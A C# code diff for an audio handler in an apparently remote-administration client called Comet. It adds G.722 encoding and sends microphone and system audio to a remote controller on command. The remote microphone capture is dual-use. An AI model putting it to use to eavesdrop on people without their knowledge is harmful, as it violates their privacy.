@@ -5,6 +5,7 @@ using Comet.Common.Video;
 using Microsoft.Win32;
 using NAudio.CoreAudioApi;
 using NAudio.Wave;
+using NAudioDemo.NetworkChatDemo;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -12,17 +13,21 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Comet.Common.Utilities;
+using NAudio.Codecs;
+using System.Diagnostics;
 
 namespace Comet.Client.Messages
 {
     internal class AudioHandler : NotificationMessageProcessor, IDisposable
     {
         static ISender _client;
-        private IWaveIn system;
         internal WaveOut WaveOut = new WaveOut();
         private static WaveInEvent microphone;
         private static WasapiCapture capture;
         internal BufferedWaveProvider BufferedWaveProvider;
+        private readonly G722CodecState encoderState = new G722CodecState(64000, G722Flags.None);
+        private readonly G722Codec codec = new G722Codec();
 
         public override bool CanExecute(IMessage message) => message is GetAudioNames||
                                                              message is GetAudioResponse||
@@ -96,31 +101,34 @@ namespace Comet.Client.Messages
 
         private void Execute(ISender client, GetAudioResponse message)
         {
+            G722CodecState encoderState;
+
             switch (message.IsSystem)
             {
                 case true:
                     
                     capture = new WasapiLoopbackCapture();
-                    capture.DataAvailable += WaveDataAvailable;
+                    capture.DataAvailable += WaveDataAvailableSys;
                     capture.RecordingStopped += SystemWaveStop;
                     capture.StartRecording();
                     break;
                 default:
                     microphone?.StopRecording();
                     microphone = new WaveInEvent();
-                    microphone.WaveFormat = new WaveFormat(44100, 1);
+                    encoderState = new G722CodecState(64000, G722Flags.None);
+                    microphone.WaveFormat = new WaveFormat(16000, 1);
                     microphone.DeviceNumber = 0;
-                    microphone.DataAvailable += WaveDataAvailable;
+                    microphone.DataAvailable += WaveDataAvailableMicro;
                     microphone.RecordingStopped += MicWaveStop;
                     microphone.StartRecording();
                     break;
             }
         }
-        
+
         void Execute(ISender client, SendMicrophoneInit message)
         {
             _client.Send(new SendMicrophoneInit());
-            BufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(44100, 1));
+            BufferedWaveProvider = new BufferedWaveProvider(new WaveFormat(16000, 1));
             WaveOut.DeviceNumber = 0;
             WaveOut?.Init(BufferedWaveProvider);
             WaveOut?.Play();
@@ -137,11 +145,6 @@ namespace Comet.Client.Messages
             BufferedWaveProvider?.ClearBuffer();
         }
 
-        void StopMic() 
-        {
-            microphone?.StopRecording();
-        }
-
         private void Execute(ISender client, DoAudioStop message)
         {
             capture?.StopRecording();
@@ -150,18 +153,43 @@ namespace Comet.Client.Messages
             BufferedWaveProvider?.ClearBuffer();
         }
 
-        void WaveDataAvailable(object sender, WaveInEventArgs e)
+        void WaveDataAvailableMicro(object sender, WaveInEventArgs e)
         {
             if (e.Buffer.Length>0 && e.BytesRecorded>0)
             {
                 _client.Send(new GetAudioResponse
                 {
-                    Buffer = Encode(e.Buffer, 0, e.BytesRecorded),
+                    Buffer = EncodeMicro(e.Buffer, 0, e.BytesRecorded),
                     BytesRecorded = e.BytesRecorded
                 });
             }
         }
-        byte[] Encode(byte[] data, int offset, int length)
+        void WaveDataAvailableSys(object sender, WaveInEventArgs e)
+        {
+            if (e.Buffer.Length > 0 && e.BytesRecorded > 0)
+            {
+                _client.Send(new GetAudioResponse
+                {
+                    Buffer = EncodeSys(e.Buffer, 0, e.BytesRecorded),
+                    BytesRecorded = e.BytesRecorded,
+                    IsSystem = true
+                });
+            }
+        }
+        byte[] EncodeMicro(byte[] data, int offset, int length)
+        {
+            if (offset != 0)
+            {
+                throw new ArgumentException("G722 does not yet support non-zero offsets");
+            }
+            var wb = new WaveBuffer(data);
+            int encodedLength = length / 4;
+            var outputBuffer = new byte[encodedLength];
+            int encoded = codec.Encode(encoderState, outputBuffer, wb.ShortBuffer, length / 2);
+            Debug.Assert(encodedLength == encoded);
+            return outputBuffer;
+        }
+        byte[] EncodeSys(byte[] data, int offset, int length)
         {
             var encoded = new byte[length];
             Array.Copy(data, offset, encoded, 0, length);
